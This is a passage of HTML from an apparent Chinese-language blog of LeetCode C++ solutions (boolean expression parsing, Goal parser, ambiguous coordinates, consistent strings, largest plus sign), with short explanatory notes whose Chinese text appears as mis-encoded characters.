class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reachNumber</span><span class="params">(<span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        target = <span class="built_in">abs</span>(target);</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(sum &lt; target) &#123;</span><br><span class="line">            n++;</span><br><span class="line">            sum += n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((sum-target) % <span class="number">2</span> == <span class="number">0</span>) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">return</span> n + n%<span class="number">2</span> +<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>æ ¹æ®æ–¹æ³•1ï¼Œè°ƒæ•´çš„æ­¥æ•°æœ€å¤š3æ­¥ï¼Œè¿›ä¸€æ­¥åˆ†æï¼Œå½“diffä¸ºå¥‡æ•°æ—¶ï¼ŒsumåŠ å‡ ä¸ªæ•°å¯ä»¥å˜æˆå¶æ•°ï¼Œæ ¹æ®å…¬å¼ $$ sum &#x3D; n(n+1)&#x2F;2 $$<br>å¯çŸ¥ï¼š<br>nå¶æ•°ï¼Œsumå¶æ•°ï¼Œn+1å¥‡æ•°ï¼Œ<code>sum=sum+n+1</code>åsumå˜å¥‡æ•°<br>$$ n &#x3D; 4i, sum&#x3D;2i(2i+1) $$<br> nå¥‡æ•°ï¼Œsumå¥‡æ•°ï¼Œn+1å¶æ•°ï¼Œn+2å¥‡æ•°ï¼Œ<code>sum=sum+n+1+n+2</code>åsumå˜å¶æ•°<br>$$ n &#x3D; 4i+1, sum&#x3D;(4i+1)(2i+1) $$<br>nå¶æ•°ï¼Œsumå¥‡æ•°ï¼Œn+1å¥‡æ•°ï¼Œ<code>sum=sum+n+1</code>åsumå˜å¶æ•°<br>$$ n &#x3D; 4i+2, sum&#x3D;(2i+1)(4i+3) $$<br>nå¥‡æ•°ï¼Œsumå¶æ•°ï¼Œn+1å¶æ•°ï¼Œn+2å¥‡æ•°<code>sum=sum+n+1+n+2</code>åsumå˜å¥‡æ•°<br>$$ n &#x3D; 4i+3, sum&#x3D;(4i+3)(2i+2) $$ </p><p>ç”±äºdiffä¸ºå¥‡æ•°ï¼Œåˆ™sumä¸ºå¥‡æ•°æ—¶è¦å˜æˆå¶æ•°ï¼Œå¦åˆ™å˜æˆå¥‡æ•°<br>æ•´ç†ä¸Šé¢çš„è®¨è®ºï¼Œå¯çŸ¥è°ƒæ•´çš„æ­¥æ•°ä¸º<code>n%2+1</code>ï¼Œæ€»æ­¥æ•°ä¸º<code>n+n%2+1</code></p></blockquote><h2 id="1106-è§£æå¸ƒå°”è¡¨è¾¾å¼"><a href="#1106-è§£æå¸ƒå°”è¡¨è¾¾å¼" class="headerlink" title="1106. è§£æå¸ƒå°”è¡¨è¾¾å¼"></a><a href="https://leetcode.cn/problems/parsing-a-boolean-expression/">1106. è§£æå¸ƒå°”è¡¨è¾¾å¼</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">const</span> <span class="type">static</span> <span class="type">int</span> NOT = <span class="string">&#x27;!&#x27;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">static</span> <span class="type">int</span> AND = <span class="string">&#x27;&amp;&#x27;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">static</span> <span class="type">int</span> OR = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">parseBoolExpr</span><span class="params">(string expression)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="type">char</span>&gt; ops;</span><br><span class="line">        stack&lt;<span class="type">char</span>&gt; value;</span><br><span class="line">        <span class="type">int</span> len = expression.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(expression[i] == <span class="string">&#x27;t&#x27;</span> || expression[i] == <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">                value.<span class="built_in">push</span>(expression[i]);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(expression[i] == NOT || expression[i] == AND || expression[i] == OR) &#123;</span><br><span class="line">                ops.<span class="built_in">push</span>(expression[i]);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(expression[i] == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                value.<span class="built_in">push</span>(<span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(expression[i] == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">                <span class="type">char</span> op = ops.<span class="built_in">top</span>();</span><br><span class="line">                ops.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="type">bool</span> res = value.<span class="built_in">top</span>() == <span class="string">&#x27;t&#x27;</span>? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">                value.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span>(op == NOT) &#123;</span><br><span class="line">                    res = !res;</span><br><span class="line">                    <span class="keyword">if</span>(!value.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                        value.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span>(!value.<span class="built_in">empty</span>() &amp;&amp; value.<span class="built_in">top</span>() != <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                        <span class="type">bool</span> temp = value.<span class="built_in">top</span>() == <span class="string">&#x27;t&#x27;</span>? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">                        <span class="keyword">if</span> (op == AND) &#123;</span><br><span class="line">                            res &amp;= temp;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(op == OR) &#123;</span><br><span class="line">                            res |= temp;</span><br><span class="line">                        &#125;</span><br><span class="line">                        value.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(!value.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                        value.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                value.<span class="built_in">push</span>(res ? <span class="string">&#x27;t&#x27;</span> : <span class="string">&#x27;f&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value.<span class="built_in">top</span>() == <span class="string">&#x27;t&#x27;</span>? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>å°±æ˜¯å†™ä¸€ä¸ªè®¡ç®—å™¨ï¼Œéš¾ç‚¹åœ¨äºnå…ƒè¿ç®—ï¼Œéœ€è¦åœ¨æ•°å€¼æ ˆä¸­ä¿å­˜æ‹¬å·ï¼Œä»¥åˆ¤æ–­æ¯ä¸ªæ“ä½œä½œç”¨äºé‚£äº›å€¼</p></blockquote><h2 id="1678-è®¾è®¡-Goal-è§£æå™¨"><a href="#1678-è®¾è®¡-Goal-è§£æå™¨" class="headerlink" title="1678. è®¾è®¡ Goal è§£æå™¨"></a><a href="https://leetcode.cn/problems/goal-parser-interpretation/">1678. è®¾è®¡ Goal è§£æå™¨</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">interpret</span><span class="params">(string command)</span> </span>&#123;</span><br><span class="line">        string s;</span><br><span class="line">        <span class="type">int</span> len = command.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(command[i] == <span class="string">&#x27;G&#x27;</span>) &#123;</span><br><span class="line">                s.<span class="built_in">push_back</span>(<span class="string">&#x27;G&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(command[i] == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(command[i+<span class="number">1</span>] == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">                    s.<span class="built_in">push_back</span>(<span class="string">&#x27;o&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    s.<span class="built_in">push_back</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">                    s.<span class="built_in">push_back</span>(<span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="816-æ¨¡ç³Šåæ ‡"><a href="#816-æ¨¡ç³Šåæ ‡" class="headerlink" title="816. æ¨¡ç³Šåæ ‡"></a><a href="https://leetcode.cn/problems/ambiguous-coordinates/">816. æ¨¡ç³Šåæ ‡</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">ambiguousCoordinates</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        len = s.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;string&gt; coord;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt; len<span class="number">-1</span>; i++) &#123;</span><br><span class="line">            vector&lt;string&gt; n1;</span><br><span class="line">            vector&lt;string&gt; n2;</span><br><span class="line">            <span class="built_in">gen</span>(<span class="built_in">move</span>(s), <span class="number">1</span>, i, n1);</span><br><span class="line">            <span class="type">int</span> len1 = n1.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">if</span>(len1 &lt;=<span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="built_in">gen</span>(<span class="built_in">move</span>(s), i, len<span class="number">-1</span>, n2);</span><br><span class="line">            <span class="type">int</span> len2 = n2.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">if</span>(len2 &lt;= <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k1 = <span class="number">0</span>; k1 &lt; len1; k1++) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k2=<span class="number">0</span>; k2&lt; len2; k2++) &#123;</span><br><span class="line">                    coord.<span class="built_in">push_back</span>(<span class="string">&quot;(&quot;</span> + n1[k1] + <span class="string">&quot;, &quot;</span> + n2[k2] + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> coord;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">gen</span><span class="params">(string&amp;&amp; s, <span class="type">int</span> i, <span class="type">int</span> j, vector&lt;string&gt;&amp; ret)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[j<span class="number">-1</span>] == <span class="string">&#x27;0&#x27;</span> &amp;&amp; s[i] ==<span class="string">&#x27;0&#x27;</span> &amp;&amp; j-i&gt;<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s[j<span class="number">-1</span>] == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">            ret.<span class="built_in">push_back</span>(s.<span class="built_in">substr</span>(i, j-i));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s[i] == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">            ret.<span class="built_in">push_back</span>(<span class="string">&quot;0.&quot;</span> + s.<span class="built_in">substr</span>(i+<span class="number">1</span>, j-i<span class="number">-1</span>));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k = i; k &lt; j<span class="number">-1</span>; k++) &#123;</span><br><span class="line">            ret.<span class="built_in">push_back</span>(s.<span class="built_in">substr</span>(i, k-i+<span class="number">1</span>) + <span class="string">&quot;.&quot;</span> + s.<span class="built_in">substr</span>(k+<span class="number">1</span>, j-k<span class="number">-1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        ret.<span class="built_in">push_back</span>(s.<span class="built_in">substr</span>(i, j-i));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1684-ç»Ÿè®¡ä¸€è‡´å­—ç¬¦ä¸²çš„æ•°ç›®"><a href="#1684-ç»Ÿè®¡ä¸€è‡´å­—ç¬¦ä¸²çš„æ•°ç›®" class="headerlink" title="1684. ç»Ÿè®¡ä¸€è‡´å­—ç¬¦ä¸²çš„æ•°ç›®"></a><a href="https://leetcode.cn/problems/count-the-number-of-consistent-strings/">1684. ç»Ÿè®¡ä¸€è‡´å­—ç¬¦ä¸²çš„æ•°ç›®</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countConsistentStrings</span><span class="params">(string allowed, vector&lt;string&gt;&amp; words)</span> </span>&#123;</span><br><span class="line">        <span class="type">bool</span> all[<span class="number">129</span>] = &#123;<span class="literal">false</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c : allowed) &#123;</span><br><span class="line">            all[c] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(string &amp;w : words ) &#123;</span><br><span class="line">            <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">char</span> c : w) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!all[c]) &#123;</span><br><span class="line">                    flag = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="ä½è¿ç®—"><a href="#ä½è¿ç®—" class="headerlink" title="ä½è¿ç®—"></a>ä½è¿ç®—</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countConsistentStrings</span><span class="params">(string allowed, vector&lt;string&gt;&amp; words)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> all = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c : allowed) &#123;</span><br><span class="line">            all |= <span class="number">1</span> &lt;&lt; (c-<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(string &amp;w : words ) &#123;</span><br><span class="line">            <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">char</span> c : w) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!((all &gt;&gt; (c-<span class="string">&#x27;a&#x27;</span>))&amp;<span class="number">1</span>)) &#123;</span><br><span class="line">                    flag = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>é¢˜ä¸­è¯´æ˜äº† allowedåªåŒ…å«26ä¸ªå­—æ¯ï¼Œæ‰€ä»¥ç”¨ä¸€ä¸ªintå°±å¯ä»¥è¡¨ç¤ºå­—ç¬¦æ˜¯å¦å­˜åœ¨</p></blockquote><h2 id="764-æœ€å¤§åŠ å·æ ‡å¿—"><a href="#764-æœ€å¤§åŠ å·æ ‡å¿—" class="headerlink" title="764. æœ€å¤§åŠ å·æ ‡å¿—"></a><a href="https://leetcode.cn/problems/largest-plus-sign/">764. æœ€å¤§åŠ å·æ ‡å¿—</a></h2><h3 id="å‰ç¼€å’Œ"><a href="#å‰ç¼€å’Œ" class="headerlink" title="å‰ç¼€å’Œ"></a>å‰ç¼€å’Œ</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">orderOfLargestPlusSign</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; mines)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">mat</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">1</span>)), <span class="built_in">x</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n+<span class="number">1</span>, n)),<span class="built_in">y</span>(n+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, n));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> mine : mines) &#123;</span><br><span class="line">            mat[mine[<span class="number">0</span>]][mine[<span class="number">1</span>]] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = n<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = n<span class="number">-1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="keyword">if</span>(mat[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                    x[i][j] = x[i][j+<span class="number">1</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    x[i][j] = j;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(mat[j][i] == <span class="number">1</span>) &#123;</span><br><span class="line">                    y[j][i] = y[j+<span class="number">1</span>][i];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    y[j][i] = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">miny</span><span class="params">(n, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        <span class="type">int</span> maxx = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> minx = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(mat[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">                    minx = j;</span><br><span class="line">                    miny[j] = i;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    maxx = <span class="built_in">max</span>(maxx, <span class="built_in">min</span>(<span class="built_in">min</span>(x[i][j] - j , j - minx),  <span class="built_in">min</span>(y[i][j] - i , i - miny[j])));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>åˆšå¼€å§‹æƒ³ç”¨dpï¼Œä½†æ˜¯æƒ³æ³•ä¸å¯¹ï¼Œè¯•äº†7.8æ¬¡ï¼Œæœ€åæƒ³åˆ°æ­£ç¡®çš„æ–¹æ³•<br>x, yè®°å½•ç‚¹(i, j) å³æµ‹&#x2F;ä¸‹æ–¹ç¬¬ä¸€ä¸ª0çš„åæ ‡ï¼Œminxè®°å½•å·¦æ–¹ç¬¬ä¸€ä¸ª0çš„åæ ‡ï¼Œminyè®°å½•ä¸Šæ–¹ç¬¬ä¸€ä¸ª0çš„ä½ç½®<br>matç”¨æ¥ä¿å­˜è¿™ä¸ªçŸ©é˜µ<br>åŠ å·çš„é˜¶æ•°ä¸º(i, j)åæ ‡åˆ°ä¸Šä¸‹å·¦å³å››ä¸ªæ–¹å‘ä¸Šæœ€è¿‘çš„0çš„è·ç¦»çš„æœ€å°å€¼<br>è¦æ³¨æ„ç‰¹æ®Šå€¼çš„å¤„ç†ï¼Œå³ä¾§&#x2F;ä¸‹æ–¹æ²¡æœ‰0ï¼Œåˆ™è®°å…¶åæ ‡ä¸º<code>n</code>,ä¸Šæ–¹&#x2F;å·¦ä¾§æ²¡æœ‰0è®°ä¸º<code>-1</code></p></blockquote><blockquote><p>ä¸€ç›´ä»¥ä¸ºåªæœ‰æŠŠæŸä¸€ä¾§çš„æ•°å…¨éƒ½åŠ èµ·æ¥æ‰ç®—å‰ç¼€å’Œ<br>åªè¦æ˜¯æŠŠæ¯ä¸ªä½ç½®ä¹‹å‰çš„ä¸€ç»´çº¿æ®µæˆ–äºŒç»´çŸ©å½¢é¢„å…ˆå­˜å‚¨ï¼Œå°±å«åšå‰ç¼€å’Œ&#x2F;ç§¯åˆ†å›¾</p></blockquote><h3 id="å¤§ä½¬çš„è§£æ³•"><a href="#å¤§ä½¬çš„è§£æ³•" class="headerlink" title="å¤§ä½¬çš„è§£æ³•"></a>å¤§ä½¬çš„è§£æ³•</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">orderOfLargestPlusSign</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; mines)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, n));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; e : mines) dp[e[<span class="number">0</span>]][e[<span class="number">1</span>]] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>, up = <span class="number">0</span>, down = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>, k = n - <span class="number">1</span>; j &lt; n; ++j, --k) &#123;</span><br><span class="line">                left = dp[i][j] ? left + <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">                right = dp[i][k] ? right + <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">                up = dp[j][i] ? up + <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">                down = dp[k][i] ? down + <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">                dp[i][j] = <span class="built_in">min</span>(dp[i][j], left);</span><br><span class="line">                dp[i][k] = <span class="built_in">min</span>(dp[i][k], right);</span><br><span class="line">                dp[j][i] = <span 